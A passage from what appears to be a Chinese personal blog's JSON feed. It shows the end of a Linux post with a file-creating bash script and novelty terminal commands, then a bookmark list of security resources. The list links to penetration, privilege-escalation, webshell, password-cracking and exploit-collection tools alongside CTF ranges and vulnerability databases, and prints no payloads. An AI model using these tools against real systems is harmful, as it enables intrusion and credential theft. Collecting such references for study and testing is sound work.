data-src=\"/N1h1l157/Linux/20128.png\" alt></p>\n<h2 id=\"script\"><a class=\"markdownIt-Anchor\" href=\"#script\">#</a> script</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">从2.txt文件中逐行读取内容，并将每一行的内容作为文件名创建文件</span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">!/bin/bash</span></span><br><span class=\"line\">filename=&quot;2.txt&quot;</span><br><span class=\"line\">while IFS= read -r line</span><br><span class=\"line\">do</span><br><span class=\"line\">    echo &quot;$line&quot; &gt; &quot;$line&quot;</span><br><span class=\"line\">    echo &quot;Created file: $line&quot;</span><br><span class=\"line\">done &lt; &quot;$filename&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"play\"><a class=\"markdownIt-Anchor\" href=\"#play\">#</a> play</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">山羊logo 苹果logo</span> </span><br><span class=\"line\">neofetch --ascii_distro AIX</span><br><span class=\"line\">neofetch --ascii_distro GNU</span><br><span class=\"line\">neofetch --ascii_distro BSD</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20130.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20131.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20132.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 抽象字体</span><br><span class=\"line\">figlet N1h1l157.github.io</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20133.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 一句话</span><br><span class=\"line\">fortune</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20134.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 数字矩阵</span><br><span class=\"line\">cmatrix -a -s</span><br><span class=\"line\">cmatrix -r</span><br><span class=\"line\">cmatrix -m</span><br><span class=\"line\">cmatrix -abBcfsmx -C red</span><br><span class=\"line\">cmatrix -abcm -C green</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20135.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20136.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20137.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20138.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20139.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 火车</span><br><span class=\"line\">sl</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20140.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 龙 logo</span><br><span class=\"line\">cowsay -f dragon-and-cow &quot;n1h1l157&quot;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20141.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 查看天气</span><br><span class=\"line\">curl wttr.in</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20142.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 图片变为终端显示</span><br><span class=\"line\">asciiview /Users/chentuo/Public/recourses/my_image/1.png</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20143.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 贪吃蛇</span><br><span class=\"line\">nsnake</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20144.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 数字游戏</span><br><span class=\"line\">greed</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20145.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 跳跳车</span><br><span class=\"line\">moon-buggy</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20146.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 资源监视器</span><br><span class=\"line\">htop</span><br><span class=\"line\">vtop</span><br><span class=\"line\">gtop</span><br><span class=\"line\">bashtop</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20147.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20148.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20149.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20150.png\" alt></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 剩余磁盘统计</span><br><span class=\"line\">ncdu</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/Linux/20151.png\" alt><br>\n<img data-src=\"/N1h1l157/Linux/20152.png\" alt></p>\n",
            "tags": [
                "Linux"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2023/05/10/SAFE/Security%20URL/",
            "url": "http://www.n1h1l157.live/2023/05/10/SAFE/Security%20URL/",
            "title": "信息安全 网址",
            "date_published": "2023-05-09T16:00:00.000Z",
            "content_html": "<p>清空自己的浏览器收藏夹，将过去两年内收集到的网址放在这里。</p>\n<h3 id=\"地理位置\"><a class=\"markdownIt-Anchor\" href=\"#地理位置\">#</a> 地理位置</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3Blbmdwcy5jbi9EYXRhL0lQL0lQU2VhcmNoLmFzcHg=\">openGPS 位置服务，推断 ip 具体位置:https://www.opengps.cn/Data/IP/IPSearch.aspx</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cub3Blbmdwcy5jbi9EYXRhL0lQL0xvY0hpZ2hBY2MuYXNweA==\">openGPS 位置服务，高精度 ip 定位:https://www.opengps.cn/Data/IP/LocHighAcc.aspx</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pcC50b29sLmNoaW5hei5jb20vMTIwLjIyMS4yMTguMTU5\">ip.tool.chinaz.com, IP 地址查询工具，https://ip.tool.chinaz.com/120.221.218.159</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9nZXQtc2l0ZS1pcC5jb20v\">get-site-ip.com, 获取网站 IP 地址，https://get-site-ip.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pcGlwLm5ldC9jZG4ucGhw\">tools.ipip.net, IP 地址查询工具，https://tools.ipip.net/cdn.php</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93ZWJzY2FuLmNjL3NpdGVfd3d3LnNkanUuZWR1LmNuLw==\">webscan.cc, WebScan 网站安全检测，https://webscan.cc/site_www.sdju.edu.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3dob2lzLnBjb25saW5lLmNvbS5jbi8/aXA9NjAuOC4xMjUuMQ==\">whois.pconline.com.cn, IP 查询工具，http://whois.pconline.com.cn/?ip=60.8.125.1</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9teWxvY2F0aW9uLm9yZy8=\">mylocation.org/, 我的地理位置，https://mylocation.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2h0dHBiaW4ub3JnL2lw\">httpbin.org/ip, IP 信息查询，http://httpbin.org/ip</span></p>\n<h3 id=\"网站渗透\"><a class=\"markdownIt-Anchor\" href=\"#网站渗透\">#</a> 网站渗透</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0VuYWJsZVNlY3VyaXR5L3dhZncwMGY=\">WAFW00F, WAF 产品进行识别和指纹识别:https://github.com/EnableSecurity/wafw00f</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdDR3b28vdGVlbW8=\">Teemo, 域名收集及枚举工具:https://github.com/bit4woo/teemo</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20=\">securitytrails, 历史 DNS 解析，https://securitytrails.com</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL3N1YkRvbWFpbnNCcnV0ZQ==\">subDomainsBrute, 子域名爆破，https://github.com/lijiejie/subDomainsBrute</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcnQuc2g=\">crt, 证书收集域，https://crt.sh</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JvYmVydGRhdmlkZ3JhaGFtL21hc3NjYW4=\">robertdavidgraham/masscan, masscan 开源扫描器，https://github.com/robertdavidgraham/masscan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3poenlrZXIvdnVsbWFw\">zhzyker/vulmap, vulmap 漏洞利用工具集，https://github.com/zhzyker/vulmap</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NhbXJhdGFzaG9rL25pc2hhbmc=\">samratashok/nishang, Nishang 渗透测试脚本，https://github.com/samratashok/nishang</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0g0Y2tGb3JKb2IvZGlybWFw\">H4ckForJob/dirmap, Dirmap 目录扫描工具，https://github.com/H4ckForJob/dirmap</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2NoYWl0aW4veHJheQ==\">chaitin/xray, xray 漏洞扫描工具，https://github.com/chaitin/xray</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2tub3duc2VjL3BvY3N1aXRlMw==\">knownsec/pocsuite3, Pocsuite3 漏洞测试框架，https://github.com/knownsec/pocsuite3</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL21ha290bzU2L3BlbmV0cmF0aW9uLXN1aXRlLXRvb2xraXQ=\">makoto56/penetration-suite-toolkit, 渗透套件工具，https://github.com/makoto56/penetration-suite-toolkit</span></p>\n<h3 id=\"渗透测试\"><a class=\"markdownIt-Anchor\" href=\"#渗透测试\">#</a> 渗透测试</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3loeTAvZ2l0aHViLWN2ZS1tb25pdG9y\">yhy0/github-cve-monitor, GitHub CVE 监视工具，https://github.com/yhy0/github-cve-monitor</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Zyb2hvZmYveXNvc2VyaWFs\">frohoff/ysoserial, Java 反序列化漏洞利用工具，https://github.com/frohoff/ysoserial</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL05pY2tzdGFEQi9TZXJpYWxpemF0aW9uRHVtcGVy\">NickstaDB/SerializationDumper, Java 序列化对象分析工具，https://github.com/NickstaDB/SerializationDumper</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5kb29jY24uY29tL3BocC8=\">dooccn.com, DoocCN - PHP 中文手册，http://www.dooccn.com/php/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3l6ZGRtcjYvYXNfd2Vic2hlbGxfdmVub20=\">yzddmr6/as_webshell_venom, AS Webshell 生成工具，https://github.com/yzddmr6/as_webshell_venom</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3Rlbm5jL3dlYnNoZWxs\">tennc/webshell, WebShell 集合，https://github.com/tennc/webshell</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RvMGRsMy94c3MtbGFicw==\">do0dl3/xss-labs, XSS 漏洞实验室，https://github.com/do0dl3/xss-labs</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3MwbWQzdi9YU1N0cmlrZQ==\">s0md3v/XSStrike, XSS 漏洞检测工具，https://github.com/s0md3v/XSStrike</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3M4LmNjL2Jkc3RhdGljLmNvbS8=\">xss8.cc, XSS8 实验室，https://xss8.cc/bdstatic.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3NmdXp6ZXIuY29tL2Z1enplci5odG1s\">xssfuzzer.com, XSS 漏洞模糊测试工具，https://xssfuzzer.com/fuzzer.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2MwbnkxL3VwbG9hZC1sYWJz\">c0ny1/upload-labs, 上传漏洞实验室，https://github.com/c0ny1/upload-labs</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsbWFuZGluL2Z1eHBsb2lkZXI=\">almandin/fuxploider, Fuxploider 漏洞利用工具，https://github.com/almandin/fuxploider</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1RoZUtpbmdPZkR1Y2svZnV6ekRpY3RzIyVFNSU4RiU4MiVFNiU5NSVCMGZ1enolRTUlQUQlOTclRTUlODUlQjg=\">TheKingOfDuck/fuzzDicts, Fuzz 字典集合，https://github.com/TheKingOfDuck/fuzzDicts#% E5%8F%82% E6%95% B0fuzz% E5% AD%97% E5%85% B8</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Z1enpkYi1wcm9qZWN0L2Z1enpkYg==\">fuzzdb-project/fuzzdb, FuzzDB 漏洞测试数据库，https://github.com/fuzzdb-project/fuzzdb</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3htZW5kZXovd2Z1enov\">xmendez/wfuzz, Web 模糊测试工具，https://github.com/xmendez/wfuzz/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0F1ZGktMS9zcWxpLWxhYnM=\">Audi-1/sqli-labs, SQL 注入漏洞实验室，https://github.com/Audi-1/sqli-labs</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NxbG1hcHByb2plY3Qvc3FsbWFw\">sqlmapproject/sqlmap, SQL 注入漏洞扫描工具，https://github.com/sqlmapproject/sqlmap</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2NleWUuaW8vcmVjb3Jkcy9kbnM=\">ceye.io, DNS 记录查询工具，http://ceye.io/records/dns</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL2Ruc2xvZy5jbi8=\">dnslog.cn, DNSLog 服务，http://dnslog.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FET09PL0Ruc2xvZ1NxbGluag==\">ADOOO/DnslogSqlinj, DnslogSqlinj 漏洞利用工具，https://github.com/ADOOO/DnslogSqlinj</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9waW5nLmNoaW5hei5jb20v\">ping.chinaz.com, 站长之家 Ping 工具，https://ping.chinaz.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0ZGI=\">offensive-security/exploitdb, Exploit Database 漏洞利用库，https://github.com/offensive-security/exploitdb</span></p>\n<h3 id=\"cms扫描\"><a class=\"markdownIt-Anchor\" href=\"#cms扫描\">#</a> CMS 扫描</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cueXVuc2VlLmNuLw==\">yunsee.cn, 云溪社区，https://www.yunsee.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FqaW5hYnJhaGFtL0NNU1NjYW4=\">ajinabraham/CMSScan, CMSScan CMS 漏洞扫描器，https://github.com/ajinabraham/CMSScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3dwc2NhbnRlYW0vd3BzY2Fu\">wpscanteam/wpscan, WPScan WordPress 漏洞扫描器，https://github.com/wpscanteam/wpscan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL09XQVNQL2pvb21zY2Fu\">OWASP/joomscan, JoomScan Joomla 漏洞扫描器，https://github.com/OWASP/joomscan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0x1Y2lmZXIxOTkzL1RQc2Nhbg==\">Lucifer1993/TPscan, TPscan ThinkPHP 漏洞扫描器，https://github.com/Lucifer1993/TPscan</span></p>\n<h3 id=\"windows漏洞\"><a class=\"markdownIt-Anchor\" href=\"#windows漏洞\">#</a> windows 漏洞</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JpdHNhZG1pbi93ZXNuZw==\">wesng, WES-NG，Windows 系统漏洞利用框架，https://github.com/bitsadmin/wesng</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2Nocm9ibGVydC9XaW5kb3dzVnVsblNjYW4=\">WindowsVulnScan, Windows 漏洞扫描器，https://github.com/chroblert/WindowsVulnScan</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1NlY1dpa2kvd2luZG93cy1rZXJuZWwtZXhwbG9pdHM=\">windows-kernel-exploits, SecWiki Windows 内核漏洞利用集合，https://github.com/SecWiki/windows-kernel-exploits</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2dlbnRpbGtpd2kvbWltaWthdHo=\">gentilkiwi/mimikatz, Mimikatz 密码工具，https://github.com/gentilkiwi/mimikatz</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FsZXNzYW5kcm9aL0xhWmFnbmU=\">AlessandroZ/LaZagne, LaZagne 密码恢复工具，https://github.com/AlessandroZ/LaZagne</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0FzY290YmUvS2VybmVsSHVi\">Ascotbe/KernelHub, KernelHub, https://github.com/Ascotbe/KernelHub</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9sb2xiYXMtcHJvamVjdC5naXRodWIuaW8v\">lolbas-project.github.io, Windows Living Off The Land Binaries, https://lolbas-project.github.io/</span></p>\n<h3 id=\"linux漏洞\"><a class=\"markdownIt-Anchor\" href=\"#linux漏洞\">#</a> linux 漏洞</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3JlYm9vdHVzZXIvTGluRW51bQ==\">rebootuser/LinEnum, LinEnum Linux 枚举脚本，https://github.com/rebootuser/LinEnum</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NsZXZlbnR5ZWxldmVuL2xpbnV4cHJpdmNoZWNrZXI=\">sleventyeleven/linuxprivchecker, Linux Privilege Escalation 脚本，https://github.com/sleventyeleven/linuxprivchecker</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL216ZXQtL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVy\">mzet-/linux-exploit-suggester, Linux Exploit Suggester 脚本，https://github.com/mzet-/linux-exploit-suggester</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2pvbmRvbmFzL2xpbnV4LWV4cGxvaXQtc3VnZ2VzdGVyLTI=\">jondonas/linux-exploit-suggester-2, Linux Exploit Suggester 2 脚本，https://github.com/jondonas/linux-exploit-suggester-2</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">gtfobins.github.io, Linux 提权技巧合集，https://gtfobins.github.io/</span></p>\n<h3 id=\"测试靶场\"><a class=\"markdownIt-Anchor\" href=\"#测试靶场\">#</a> 测试靶场</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubW96aGUuY24v\">mozhe.cn, 墨者信息收集平台，https://www.mozhe.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWNodW5xaXUuY29tL2JhdHRhbGlvbj90PTEmYW1wO3I9MA==\">ichunqiu.com, i 春秋在线训练平台，https://www.ichunqiu.com/battalion?t=1&amp;r=0</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL0NURlRyYWluaW5nL0NURlRyYWluaW5n\">CTFTraining/CTFTraining, CTFTraining 平台，https://github.com/CTFTraining/CTFTraining</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYuYnVna3UuY29tLw==\">ctf.bugku.com, Bugku CTF 平台，https://ctf.bugku.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY3RmaHViLmNvbS8jL2NoYWxsZW5nZQ==\">ctfhub.com, CTFHub 平台，https://www.ctfhub.com/#/challenge</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi8=\">buuoj.cn, BUUCTF 平台，https://buuoj.cn/</span></p>\n<h3 id=\"密码破解\"><a class=\"markdownIt-Anchor\" href=\"#密码破解\">#</a> 密码破解</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY21kNS5jb20v\">cmd5.com, CMD5 在线密码解密，https://www.cmd5.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS90b29scy9iYXNlNjQuYXNweA==\">tool.chinaz.com/tools/base64.aspx, 在线 Base64 编码解码工具，http://tool.chinaz.com/tools/base64.aspx</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuMTA3MDAwLmNvbS9ULUhleC8=\">107000.com/T-Hex, 十六进制转换工具，https://www.107000.com/T-Hex/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cDovL3Rvb2wuY2hhY3VvLm5ldC9jcnlwdGRlcw==\">tool.chacuo.net/cryptdes, 在线 DES 加解密工具，http://tool.chacuo.net/cryptdes</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3NoYWNrMi9TTkVUQ3JhY2tlcg==\">shack2/SNETCracker, SNETCracker 密码破解工具，https://github.com/shack2/SNETCracker</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ZhbmhhdXNlci10aGMvdGhjLWh5ZHJh\">vanhauser-thc/thc-hydra, Hydra 密码破解工具，https://github.com/vanhauser-thc/thc-hydra</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RqdW5ueS9lbnBocA==\">djunny/enphp, ENPHP 加密工具，https://github.com/djunny/enphp</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwamlhbWkuY29tL3BocGppYW1pLmh0bWw=\">phpjiami.com, PHP 加密解密工具，https://www.phpjiami.com/phpjiami.html</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZGNvZGUuZnIvY2lwaGVyLWlkZW50aWZpZXI=\">dcode.fr, 密码学算法识别器，https://www.dcode.fr/cipher-identifier</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL01lYnVzL2N1cHA=\">Mebus/cupp, 用户自定义密码字典生成器，https://github.com/Mebus/cupp</span></p>\n<h3 id=\"操作系统\"><a class=\"markdownIt-Anchor\" href=\"#操作系统\">#</a> 操作系统</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucmpzb3MuY29tL3dpbg==\">rjsos.com/win, RJSOS Windows 系统镜像下载，https://www.rjsos.com/win</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tc2RuLml0ZWxseW91LmNuLw==\">msdn.itellyou.cn, 微软官方 MSDN 下载，https://msdn.itellyou.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGludXgub3JnL3BhZ2VzL2Rvd25sb2FkLw==\">www.linux.org/pages/download/, Linux 官方网站，https://www.linux.org/pages/download/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9taXJyb3JzLnR1bmEudHNpbmdodWEuZWR1LmNuLyM=\">mirrors.tuna.tsinghua.edu.cn/#, 清华大学开源软件镜像站，https://mirrors.tuna.tsinghua.edu.cn/#</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly91dXBkdW1wLm5ldC8/bGFuZz16aC1jbg==\">uupdump.net/?lang=zh-cn, UUPDump.NET，Windows 镜像下载工具，https://uupdump.net/?lang=zh-cn</span></p>\n<h3 id=\"漏洞信息库\"><a class=\"markdownIt-Anchor\" href=\"#漏洞信息库\">#</a> 漏洞信息库</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY252ZC5vcmcuY24v\">cnvd.org.cn, 中国国家信息安全漏洞库，https://www.cnvd.org.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi4wZGF5LnRvZGF5Lw==\">cn.0day.today, 0day.today 中国站，https://cn.0day.today/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20v\">exploit-db.com, Exploit Database, https://www.exploit-db.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly92dWxodWIub3JnLyMvZW52aXJvbm1lbnRzLw==\">vulhub.org, vulhub 环境搭建教程，https://vulhub.org/#/environments/</span></p>\n<h3 id=\"漏洞提交平台\"><a class=\"markdownIt-Anchor\" href=\"#漏洞提交平台\">#</a> 漏洞提交平台</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYnV0aWFuLm5ldC8=\">butian.net, 补天漏洞报告平台，https://www.butian.net/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsYm94LmNvbS8=\">vulbox.com, VulBox 漏洞平台，https://www.vulbox.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zcmMuc2p0dS5lZHUuY24v\">src.sjtu.edu.cn, 大学 src, https://src.sjtu.edu.cn/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VlYnVnLm9yZy8=\">seebug.org, Seebug 漏洞平台，https://www.seebug.org/</span></p>\n<h3 id=\"搜索引擎\"><a class=\"markdownIt-Anchor\" href=\"#搜索引擎\">#</a> 搜索引擎</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb2ZhLmluZm8v\">fofa.info, Fofa 搜索引擎，https://fofa.info/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbi5iaW5nLmNvbS8=\">cn.bing.com, 必应搜索引擎，https://cn.bing.com/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2hvZGFuLmlvLw==\">shodan.io, Shodan 搜索引擎，https://www.shodan.io/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuem9vbWV5ZS5vcmcv\">zoomeye.org, ZoomEye 搜索引擎，https://www.zoomeye.org/</span><br>\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9xdWFrZS4zNjAuY24vcXVha2UvIy9pbmRleA==\">quake.360.cn, 360 搜索中心，https://quake.360.cn/quake/#/index</span></p>\n<h3 id=\"安全社区\"><a class=\"markdownIt-Anchor\" href=\"#安全社区\">#</a> 安全社区</h3>\n<p><span class=\"exturl\" 